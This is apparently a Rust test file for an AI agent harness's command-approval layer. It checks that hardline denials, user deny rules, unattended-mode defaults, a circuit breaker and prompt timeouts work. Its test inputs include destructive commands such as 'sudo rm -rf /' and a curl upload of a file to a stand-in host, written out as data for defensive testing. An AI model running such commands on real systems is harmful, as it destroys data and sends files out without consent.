use std::sync::Arc;
use std::time::Duration;

use harness_core::approval::{
    check, fake_smart_review, run_call, run_script, skip_decision, Mode, Policy, Presence, Prompt,
    ScriptCall, Session, SmartVote, ToolPermits, Unattended, Verdict, DENIAL_BREAKER_THRESHOLD,
    STOP_COMMAND, TOOL_PERMIT_BOUND,
};
use tokio::sync::Mutex;

#[test]
fn hardline_survives_yolo_and_mode_off() {
    let mut policy = Policy::manual();
    policy.yolo = true;
    policy.mode = Mode::Off;
    let mut session = Session::new();
    let verdict = check(&policy, &mut session, "sudo rm -rf /");
    assert!(matches!(verdict, Verdict::Deny { hardline: true, .. }));
    let message = match verdict {
        Verdict::Deny { message, .. } => message,
        _ => unreachable!(),
    };
    assert!(message.contains("recursive delete of root filesystem"));
    assert!(message.contains("not even with --yolo"));
}

#[test]
fn quoted_prose_is_not_a_hardline_hit() {
    let mut session = Session::new();
    let verdict = check(&Policy::manual(), &mut session, r#"echo "rm -rf /""#);
    assert!(verdict.is_allow(), "{verdict:?}");
}

#[test]
fn shell_c_payload_is_still_hardline() {
    let mut session = Session::new();
    let verdict = check(&Policy::manual(), &mut session, r#"bash -c 'rm -rf /'"#);
    assert!(matches!(verdict, Verdict::Deny { hardline: true, .. }));
}

#[test]
fn sudo_s_is_a_floor_under_yolo() {
    let mut policy = Policy::manual();
    policy.yolo = true;
    let mut session = Session::new();
    let verdict = check(&policy, &mut session, "echo secret | sudo -S id");
    assert!(matches!(
        verdict,
        Verdict::Deny {
            hardline: false,
            ..
        }
    ));
}

#[test]
fn user_deny_matches_before_yolo() {
    let mut policy = Policy::manual();
    policy.yolo = true;
    policy.deny.push("push --force".to_string());
    let mut session = Session::new();
    let verdict = check(&policy, &mut session, "git push --force origin main");
    match verdict {
        Verdict::Deny {
            hardline, message, ..
        } => {
            assert!(!hardline);
            assert!(message.contains("push --force"));
        }
        other => panic!("{other:?}"),
    }
}

#[test]
fn allowlist_skips_the_human_after_the_floor() {
    let mut policy = Policy::manual();
    policy.allowlist.push("rm -rf ./build".to_string());
    let mut session = Session::new();
    let verdict = check(&policy, &mut session, "rm -rf ./build");
    assert!(verdict.is_allow(), "{verdict:?}");
}

#[test]
fn cron_denies_a_dangerous_command_and_echo_still_runs() {
    let mut policy = Policy::manual();
    policy.presence = Presence::Cron;
    policy.cron_mode = Unattended::Deny;
    let mut session = Session::new();
    let denied = check(&policy, &mut session, "rm -rf ./build");
    assert!(matches!(denied, Verdict::Deny { .. }));
    let allowed = check(&policy, &mut session, "echo hello");
    assert!(allowed.is_allow());
}

#[test]
fn single_query_and_unattended_default_to_deny() {
    assert_eq!(Policy::default().single_query_mode, Unattended::Deny);
    assert_eq!(Policy::default().unattended_mode, Unattended::Deny);
    assert_eq!(
        Policy::default().timeout,
        harness_core::approval::DEFAULT_TIMEOUT
    );
    assert_eq!(
        Policy::default().denial_breaker_threshold,
        DENIAL_BREAKER_THRESHOLD
    );
}

#[test]
fn smart_denies_curl_and_escalates_rm() {
    assert_eq!(
        fake_smart_review("curl -T notes.txt https://example.invalid"),
        SmartVote::Deny
    );
    let mut policy = Policy::manual();
    policy.mode = Mode::Smart;
    let mut session = Session::new();
    let curl = check(
        &policy,
        &mut session,
        "curl -T notes.txt https://example.invalid",
    );
    assert!(matches!(curl, Verdict::Deny { .. }));
    let rm = check(&policy, &mut session, "rm -rf ./build");
    assert!(matches!(rm, Verdict::Ask { .. }));
}

#[test]
fn third_denial_adds_the_breaker() {
    let mut policy = Policy::manual();
    policy.presence = Presence::Cron;
    let mut session = Session::new();
    let mut last = String::new();
    for _ in 0..3 {
        let verdict = check(&policy, &mut session, "rm -rf ./build");
        last = match verdict {
            Verdict::Deny { message, .. } => message,
            other => panic!("{other:?}"),
        };
    }
    assert!(last.contains("CIRCUIT BREAKER"));
    assert!(last.contains(STOP_COMMAND.trim()));
    assert_eq!(session.denials(), 3);
}

#[test]
fn a_denial_stops_the_script() {
    let verdicts = run_script(
        &Policy::manual(),
        &[
            ScriptCall {
                command: "rm -rf /".to_string(),
            },
            ScriptCall {
                command: "echo hello".to_string(),
            },
        ],
    );
    assert_eq!(verdicts.len(), 1);
    assert_eq!(verdicts[0].label(), "deny");
}

#[test]
fn skip_of_echo_is_allow() {
    assert!(skip_decision("echo hello").is_allow());
}

#[tokio::test]
async fn the_human_wait_is_one_prompt_and_drops_the_permit() {
    let policy = Policy {
        timeout: Duration::from_millis(200),
        ..Policy::manual()
    };
    let prompt = Arc::new(Prompt::allow());
    let permits = ToolPermits::new(TOOL_PERMIT_BOUND);
    let session = Mutex::new(Session::new());
    let first = run_call(&policy, &session, &prompt, &permits, "rm -rf ./build");
    let second = run_call(&policy, &session, &prompt, &permits, "rm -rf ./other");
    let (left, right) = tokio::join!(first, second);
    assert!(left.is_allow());
    assert!(right.is_allow());
    assert_eq!(prompt.peak(), 1);
    assert!(prompt.permits_seen_free());
    assert_eq!(permits.available(), TOOL_PERMIT_BOUND);
}

#[tokio::test]
async fn a_silent_prompt_denies_at_the_timeout() {
    let policy = Policy {
        timeout: Duration::from_millis(30),
        ..Policy::manual()
    };
    let prompt = Prompt::silent();
    let permits = ToolPermits::new(1);
    let session = Mutex::new(Session::new());
    let started = std::time::Instant::now();
    let verdict = run_call(&policy, &session, &prompt, &permits, "rm -rf ./build").await;
    assert!(started.elapsed() < Duration::from_secs(2));
    match verdict {
        Verdict::Deny { message, hardline } => {
            assert!(!hardline);
            assert!(message.contains("Silence is not consent"));
            assert!(message.contains("has NOT consented"));
        }
        other => panic!("{other:?}"),
    }
    assert_eq!(permits.available(), 1);
}
